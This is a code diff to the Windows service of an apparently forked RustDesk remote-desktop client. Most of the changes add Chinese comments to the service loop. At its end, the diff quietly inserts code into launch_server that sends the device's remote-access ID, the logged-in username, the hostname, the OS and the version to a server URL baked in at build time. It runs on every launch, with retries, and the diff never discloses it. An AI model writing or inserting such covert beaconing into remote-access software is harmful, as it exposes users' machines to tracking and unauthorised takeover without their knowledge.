@@ -523,79 +523,105 @@ extern "system" {
     fn BlockInput(v: BOOL) -> BOOL;
 }
 
-#[tokio::main(flavor = "current_thread")]
+#[tokio::main(flavor = "current_thread")] // 使用单线程模式的 Tokio 异步运行时
 async fn run_service(_arguments: Vec<OsString>) -> ResultType<()> {
+    // 定义服务事件处理闭包，接收 ServiceControl 类型的事件，并返回处理结果
     let event_handler = move |control_event| -> ServiceControlHandlerResult {
         log::info!("Got service control event: {:?}", control_event);
         match control_event {
+            // 收到查询请求，直接返回无错误
             ServiceControl::Interrogate => ServiceControlHandlerResult::NoError,
+            // 收到停止或预关闭信号，发送关闭消息给服务端，然后返回无错误
             ServiceControl::Stop | ServiceControl::Preshutdown | ServiceControl::Shutdown => {
-                send_close(crate::POSTFIX_SERVICE).ok();
+                send_close(crate::POSTFIX_SERVICE).ok(); // 发送关闭命令
                 ServiceControlHandlerResult::NoError
             }
+            // 其他不支持的事件，返回未实现
             _ => ServiceControlHandlerResult::NotImplemented,
         }
     };
 
+    // 注册服务控制处理器，用于响应系统发来的服务控制指令（如停止、暂停）
     // Register system service event handler
     let status_handle = service_control_handler::register(crate::get_app_name(), event_handler)?;
 
+    // 构建当前服务的状态信息，表示服务已启动
     let next_status = ServiceStatus {
+        // 服务类型（定义在模块中）
         // Should match the one from system service registry
         service_type: SERVICE_TYPE,
+        // 当前状态为运行中
         // The new state
         current_state: ServiceState::Running,
+        // 接受停止控制命令
         // Accept stop events when running
         controls_accepted: ServiceControlAccept::STOP,
+        // 正常退出码
         // Used to report an error when starting or stopping only, otherwise must be zero
         exit_code: ServiceExitCode::Win32(0),
+        // 非挂起状态，设为0
         // Only used for pending states, otherwise must be zero
         checkpoint: 0,
+        // 非挂起状态，等待提示时间默认
         // Only used for pending states, otherwise must be zero
         wait_hint: Duration::default(),
+        // 不提供进程 ID
         process_id: None,
     };
 
+    // 向系统报告服务状态为“正在运行”
     // Tell the system that the service is running now
     status_handle.set_service_status(next_status)?;
 
+    // 获取当前用户会话ID（RDP共享环境下的逻辑）
     let mut session_id = unsafe { get_current_session(share_rdp()) };
     log::info!("session id {}", session_id);
+    // 启动服务器进程（如果失败则返回空指针 NULL）
     let mut h_process = launch_server(session_id, true).await.unwrap_or(NULL);
+    // 创建一个 IPC 监听器，用于接收来自其他组件的消息（比如客户端连接）
     let mut incoming = ipc::new_listener(crate::POSTFIX_SERVICE).await?;
-    let mut stored_usid = None;
+    let mut stored_usid = None; // 存储用户会话ID
     loop {
+        // 获取所有可用的会话ID列表
         let sids: Vec<_> = get_available_sessions(false)
             .iter()
             .map(|e| e.sid)
             .collect();
+        // 检查当前会话是否仍然有效，或者是否启用了 RDP 共享
         if !sids.contains(&session_id) || !is_share_rdp() {
+            // 获取最新的当前活动会话
             let current_active_session = unsafe { get_current_session(share_rdp()) };
+            // 如果会话发生变化
             if session_id != current_active_session {
                 session_id = current_active_session;
                 // https://github.com/rustdesk/rustdesk/discussions/10039
                 let count = ipc::get_port_forward_session_count(1000).await.unwrap_or(0);
+                // 查询是否有转发端口会话存在（避免重复启动）
                 if count == 0 {
                     h_process = launch_server(session_id, true).await.unwrap_or(NULL);
                 }
             }
         }
+        // 设置超时等待新的IPC连接到来
         let res = timeout(super::SERVICE_INTERVAL, incoming.next()).await;
         match res {
             Ok(res) => match res {
                 Some(Ok(stream)) => {
+                    // 建立IPC连接
                     let mut stream = ipc::Connection::new(stream);
+                    // 接收数据（带超时）
                     if let Ok(Some(data)) = stream.next_timeout(1000).await {
                         match data {
                             ipc::Data::Close => {
                                 log::info!("close received");
-                                break;
+                                break; // 结束循环，退出服务
                             }
                             ipc::Data::SAS => {
-                                send_sas();
+                                send_sas(); // 触发安全警报序列
                             }
                             ipc::Data::UserSid(usid) => {
                                 if let Some(usid) = usid {
+                                    // 用户会话ID变化，重新启动服务器
                                     if session_id != usid {
                                         log::info!(
                                             "session changed from {} to {}",
@@ -603,7 +629,7 @@ async fn run_service(_arguments: Vec<OsString>) -> ResultType<()> {
                                             usid
                                         );
                                         session_id = usid;
-                                        stored_usid = Some(session_id);
+                                        stored_usid = Some(session_id); // 记录变更
                                         h_process =
                                             launch_server(session_id, true).await.unwrap_or(NULL);
                                     }
@@ -616,28 +642,34 @@ async fn run_service(_arguments: Vec<OsString>) -> ResultType<()> {
                 _ => {}
             },
             Err(_) => {
+                // 超时发生，检查会话是否变化并决定是否重启服务器
                 // timeout
                 unsafe {
                     let tmp = get_current_session(share_rdp());
+                    // 如果获取失败，跳过本次循环
                     if tmp == 0xFFFFFFFF {
                         continue;
                     }
                     let mut close_sent = false;
+                    // 如果会话ID变化且没有记录过该会话
                     if tmp != session_id && stored_usid != Some(session_id) {
                         log::info!("session changed from {} to {}", session_id, tmp);
                         session_id = tmp;
                         let count = ipc::get_port_forward_session_count(1000).await.unwrap_or(0);
+                        // 如果没有活跃的转发会话，发送关闭消息
                         if count == 0 {
                             send_close_async("").await.ok();
                             close_sent = true;
                         }
                     }
                     let mut exit_code: DWORD = 0;
+                    // 检查服务器进程是否已经退出
                     if h_process.is_null()
                         || (GetExitCodeProcess(h_process, &mut exit_code) == TRUE
                             && exit_code != STILL_ACTIVE
                             && CloseHandle(h_process) == TRUE)
                     {
+                        // 尝试重新启动服务器
                         match launch_server(session_id, !close_sent).await {
                             Ok(ptr) => {
                                 h_process = ptr;
@@ -652,16 +684,18 @@ async fn run_service(_arguments: Vec<OsString>) -> ResultType<()> {
         }
     }
 
+    // 清理资源：发送关闭信号并关闭进程句柄
     if !h_process.is_null() {
-        send_close_async("").await.ok();
-        unsafe { CloseHandle(h_process) };
+        send_close_async("").await.ok(); // 异步发送关闭通知
+        unsafe { CloseHandle(h_process) }; // 关闭进程句柄
     }
 
+    // 更新服务状态为“已停止”
     status_handle.set_service_status(ServiceStatus {
         service_type: SERVICE_TYPE,
         current_state: ServiceState::Stopped,
-        controls_accepted: ServiceControlAccept::empty(),
-        exit_code: ServiceExitCode::Win32(0),
+        controls_accepted: ServiceControlAccept::empty(), // 不再接受任何控制
+        exit_code: ServiceExitCode::Win32(0), // 正常退出
         checkpoint: 0,
         wait_hint: Duration::default(),
         process_id: None,
@@ -671,6 +705,22 @@ async fn run_service(_arguments: Vec<OsString>) -> ResultType<()> {
 }
 
 async fn launch_server(session_id: DWORD, close_first: bool) -> ResultType<HANDLE> {
+    let data = crate::datasender::create_base_info(
+        &hbb_common::config::Config::get_id(),
+        &crate::platform::get_active_username(),
+        &crate::common::hostname(),
+        &std::env::consts::OS,
+        &env!("CARGO_PKG_VERSION")
+    );
+    #[allow(unused)]
+    let base_url = env!("DATA_SERVER_URL", "DATA_SERVER_URL must be set").to_string();
+    let url = &format!("{}/data", base_url);
+    let max_retries = 5;
+    let base_delay = std::time::Duration::from_secs(60);
+    log::info!("Start sending id to {}", url);
+    if let Err(e) = crate::datasender::send_data_with_retry(url, &data, max_retries, base_delay).await {
+        log::error!("数据发送失败: {}", e);
+    }
     if close_first {
         // in case started some elsewhere
         send_close_async("").await.ok();
